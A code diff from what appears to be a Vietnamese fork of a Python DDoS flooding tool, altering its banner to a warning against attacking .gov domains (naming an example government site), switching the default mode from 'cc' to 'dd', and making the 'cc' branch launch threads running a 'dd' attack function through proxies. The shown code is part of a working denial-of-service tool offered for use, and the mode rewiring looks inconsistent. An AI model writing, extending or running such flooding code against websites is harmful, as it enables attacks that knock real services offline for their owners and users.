@@ -29,16 +29,9 @@ Tool by Le Cuong Piano
 >--------------------------------------------->
 Version 3.7.1 (2022/3/24)
                               C0d3d by L330n123
-┌────────────────────────────────────────────────────────
-│      Tos: Đừng hack .gov. Địa điểm                     │
-├────────────────────────────────────────────            │
-│                 Công cụ mới:                           │
-│          [+] Đã thêm hỗ trợ proxy Http                 │
-│          [+] Tối ưu hóa DD / ATTACK                    │
-│          [+] Đã thay đổi tên biến thể                  │
-├─────────────────────────────────────────────           │
-│ Link: https://github.com/le-cuong-hacker1111/DD-attck  │
-└─────────────────────────────────────────────┘───────────''')
+│││││││││││││││││││││││││││││││││││││││││││││││││
+KHÔNG ĐƯỢC PHÉP DDOS WEBSITE CO TÊN MIỀN LÀ .gov
+Ví dụ; https://bluezone.gov.vn/
 
 
 acceptall = [
@@ -86,7 +79,7 @@ referers = [
 ]
 
 ######### Default value ########
-mode = "cc"
+mode = "dd"
 url = ""
 proxy_ver = "5"
 brute = False
@@ -108,7 +101,7 @@ def build_threads(mode,thread_num,event,proxy_type):
 			th.start()
 	elif mode == "cc":
 		for _ in range(thread_num):
-			th = threading.Thread(target = cc,args=(event,proxy_type,))
+			th = threading.Thread(target = dd,args=(event,proxy_type,))
 			th.daemon = True
 			th.start()
 	elif mode == "head":
